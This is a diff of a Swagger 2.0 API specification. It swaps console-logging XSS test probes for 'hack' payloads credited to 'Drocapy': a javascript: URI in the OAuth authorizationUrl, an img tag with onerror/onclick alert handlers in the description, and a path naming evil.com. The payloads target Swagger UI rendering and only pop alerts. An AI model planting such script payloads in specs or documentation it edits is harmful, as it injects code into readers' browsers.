@@ -1,32 +1,32 @@
 swagger: '2.0'
-info:
-  version: "1.0.1"
-  title: Security Testing Spec
-  description: >
-    DOM XSS test <img src=x onerror="console.log('xss-test')">
-
 securityDefinitions:
-  testAuth:
+  a:
     type: oauth2
-    authorizationUrl: javascript:console.log('auth-xss-test')//
-
+    authorizationUrl: javascript:alert("XSS Hack By Drocapy")//
+info:
+  version: "1.0.0"
+  title: DOM XSS Hack & Javascript Code by Drocapy
+  description: Hack By Drocapy <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">////
 paths:
-  /test:
+  /Drocapy:
     get:
-      summary: Test endpoint
-      description: "<svg onload=console.log('dom-test')>"
       responses:
         '200':
-          description: OK
-
-  '/search/{param}':
+          description: Successful response
+      tags:
+        - Drocapy
+      operationId: find Accounts
+      summary: Finds all accounts
+  '/hack/hachid/{evil.com}':
     delete:
       parameters:
-        - name: param
+        - description: 
+            Successful response
+          format: int64
           in: path
+          name: id
           required: true
-          type: string
-          description: "<img src=x onerror=console.log('param-test')>"
+          type: integer
       responses:
         '200':
-          description: done
+          description: No response was specified
